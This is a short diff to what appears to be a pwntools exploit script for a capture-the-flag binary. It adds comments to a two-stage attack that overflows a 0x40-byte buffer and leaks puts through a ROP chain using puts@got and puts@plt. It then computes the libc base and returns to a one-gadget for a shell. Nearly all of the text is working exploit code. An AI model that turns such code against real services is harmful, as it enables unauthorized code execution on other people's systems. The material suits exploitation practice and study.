@@ -8,8 +8,8 @@ pr=0x4012c3
 pay=b"x"*0x40
 pay+=b'x'*0x8
 pay+=p64(pr)
-pay+=p64(0x404020)
-pay+=p64(0x401090)
+pay+=p64(0x404020) # puts@got
+pay+=p64(0x401090) # puts@plt
 pay+=p64(b.symbols['main'])
 
 r.sendline(pay)
@@ -23,7 +23,7 @@ libcbase=u64(l+b'\x00'+b'\x00')-libc.symbols['puts']
 log.info(hex(libcbase))
 pay=b'x'*0x48
 pay+=p64(0x10a45c+libcbase)
-
+#0x10a45c = oneshot
 r.sendline(pay)
 r.sendline('exit')
 r.interactive()
